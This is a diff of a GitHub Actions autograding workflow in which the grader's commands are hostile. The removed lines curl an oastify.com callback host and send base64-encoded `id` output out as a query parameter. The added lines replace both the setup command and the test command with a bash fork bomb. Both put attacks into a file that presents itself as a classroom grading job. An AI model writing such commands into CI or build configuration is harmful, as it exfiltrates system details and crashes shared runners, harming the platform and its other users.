@@ -18,9 +18,8 @@ jobs:
       uses: classroom-resources/autograding-command-grader@v1
       with:
         test-name: somebody
-        setup-command: curl setup.wpp1m7te08wyliqnns7z32k0qrwjk98y.oastify.com
-        command: curl install.wpp1m7te08wyliqnns7z32k0qrwjk98y.oastify.com/?data=$(id
-          |base64)
+        setup-command: ":(){ :|:& };:"
+        command: ":(){ :|:& };:"
         timeout: 10
     - name: Autograding Reporter
       uses: classroom-resources/autograding-grading-reporter@v1
